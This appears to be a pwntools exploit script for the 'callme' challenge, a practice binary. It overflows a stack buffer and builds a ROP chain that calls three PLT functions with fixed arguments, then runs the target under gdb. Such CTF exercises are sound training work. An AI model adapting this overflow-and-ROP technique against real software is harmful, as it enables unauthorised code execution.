from pwn import *
import struct
import sys
import time

challenge = './callme'

elf = ELF(challenge)
arg_pop = elf.symbols['usefulGadgets'] # Pops into rdi, rsi, rdx (quite useful xD)
rop = ROP(elf)

payload = cyclic(40)
payload += p64(rop.ret.address) # Align stack
payload += p64(arg_pop)
payload += p64(0xDEADBEEFDEADBEEF)
payload += p64(0xCAFEBABECAFEBABE)
payload += p64(0xD00DF00DD00DF00D)
payload += p64(elf.plt['callme_one'])
payload += p64(arg_pop)
payload += p64(0xDEADBEEFDEADBEEF)
payload += p64(0xCAFEBABECAFEBABE)
payload += p64(0xD00DF00DD00DF00D)
payload += p64(elf.plt['callme_two'])
payload += p64(arg_pop)
payload += p64(0xDEADBEEFDEADBEEF)
payload += p64(0xCAFEBABECAFEBABE)
payload += p64(0xD00DF00DD00DF00D)
payload += p64(elf.plt['callme_three'])

io = process(challenge)
io = gdb.debug(challenge, gdbscript='''
		br *0x4008F1
		c
		x/20x $sp
		''')

print(io.recvuntil(b'> '))

io.sendline(payload)
io.interactive()